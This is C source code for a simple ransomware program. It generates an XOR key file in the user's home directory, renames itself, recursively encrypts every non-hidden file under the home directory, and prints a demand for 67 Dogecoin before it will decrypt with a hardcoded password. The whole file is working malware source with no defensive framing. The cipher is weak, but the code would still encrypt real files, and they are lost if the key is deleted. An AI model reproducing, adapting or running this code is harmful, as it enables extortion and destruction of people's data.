#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>

#define RANSOM_NAME "ransomware"
#define KEY_NAME "RANSOM_KEY"
#define PASSWORD "password"
#define KEY_SIZE 4096
#define BUF_SIZE 128

struct dirent_node {
    struct dirent de;
    struct dirent_node* next;
};

int gen_key(char* key_path);
struct dirent_node* create_list(char* dir_path);
void destroy_list(struct dirent_node* list);
int encrypt_file(const char* file_name);
int encrypt_dir(const char* dir_path);

int main(int argc, char* argv[])
{
    char buf[BUF_SIZE];
    char passwd[BUF_SIZE];
    FILE* key;

    srand(time(NULL));
    sprintf(buf, "%s/%s", getenv("HOME"), KEY_NAME);
    key = fopen(buf, "r");

    if (key == NULL) {
        gen_key(buf);
        sprintf(buf, "%s/%s", getenv("HOME"), RANSOM_NAME);
        rename(argv[0], buf);    
        encrypt_dir(getenv("HOME"));

        printf("Your files have been encrypted!!1!\n");
        printf("In order to get the password to decrypt them,"
               " you must give me 67 Dogecoin\n");
        printf("If you accidently close this window,"
               " you can launch the decrypter at /home/<youruser>/%s\n", 
               RANSOM_NAME);
        printf("By the way, don't rename or delete the key or decryptor,"
               " else you'll lose all your files\n\n");

        for (;;) {
            printf("> ");
            scanf("%s", passwd);
            if (strcmp(passwd, PASSWORD) != 0)
                printf("WRONG!\n");
            else
                break;
        }
    } else {
        fclose(key);

        printf("If you don't know the password, then give me the"
               " 67 Dogecoin I demanded\n");

        for (;;) {
            printf("> ");
            scanf("%s", passwd);
            if (strcmp(passwd, PASSWORD) != 0)
                printf("WRONG!\n");
            else
                break;
        }
    }

    printf("\nOk, decrypting your files\n");
    encrypt_dir(getenv("HOME"));
    sprintf(buf, "%s/%s", getenv("HOME"), KEY_NAME);
    remove(buf);
    sprintf(buf, "%s/%s", getenv("HOME"), RANSOM_NAME);
    remove(buf);
    return 0;
}

int gen_key(char* key_path)
{
    FILE* key = fopen(key_path, "wb");
    if (key == NULL)
        return 1;

    for (size_t i = 0; i < KEY_SIZE; i++) {
        fputc(rand() % 127, key);
    }

    fclose(key);
    return 0;
}

struct dirent_node* create_list(char* dir_path)
{
    DIR* dir = opendir(dir_path);
    struct dirent_node* list = malloc(sizeof(struct dirent_node));
    struct dirent_node* node = list;
    struct dirent* de;
    
    if (dir == NULL || list == NULL) {
        closedir(dir);
        free(list);
        return NULL;
    }

    for (;;) {
        node->next = malloc(sizeof(struct dirent_node));
        if ((de = readdir(dir)) == NULL) {
            free(node->next);
            node->next = NULL;
            break;
        } else {
            node->de = *de;
            node = node->next;
        }
    }

    closedir(dir);
    return list;
}

void destroy_list(struct dirent_node* list)
{
    struct dirent_node* node = list;
    struct dirent_node* prev_node;

    while (node->next != NULL) {
        prev_node = node;
        node = node->next;
        free(prev_node);
    }
    free(node);
}

int encrypt_file(const char* file_name)
{
    char key_name[BUF_SIZE];
    sprintf(key_name, "%s/%s", getenv("HOME"), KEY_NAME);
    FILE* file = fopen(file_name, "rb+");
    FILE* key = fopen(key_name, "r");
    char ch;

    if (file == NULL && key == NULL)
        return 1;
    else if (file == NULL) {
        fclose(key);
        return 1;
    } else if (key == NULL) {
        fclose(file);
        return 1;
    }
    
    while ((ch = fgetc(file)) != EOF) {
        if (ftell(key) == KEY_SIZE)
            fseek(key, 0, SEEK_SET);
        fseek(file, -1, SEEK_CUR);
        fputc(ch ^ fgetc(key), file);
    }

    fclose(file);
    fclose(key);
    return 0;
}

int encrypt_dir(const char* dir_path)
{
    struct dirent_node* list = create_list(dir_path);
    struct dirent_node* node = list;
    char buf[BUF_SIZE];

    while (node->next != NULL) {
        if (strcmp(node->de.d_name, RANSOM_NAME) == 0 ||
            strcmp(node->de.d_name, KEY_NAME) == 0 ||
            node->de.d_name[0] == '.') {
            node = node->next;
            continue;
        }
        else if (node->de.d_type == DT_DIR) {
            sprintf(buf, "%s/%s", dir_path, node->de.d_name);
            encrypt_dir(buf);
        } else {
            sprintf(buf, "%s/%s", dir_path, node->de.d_name);
            encrypt_file(buf);
        }
        node = node->next;
    }

    destroy_list(list);
    return 0;
}

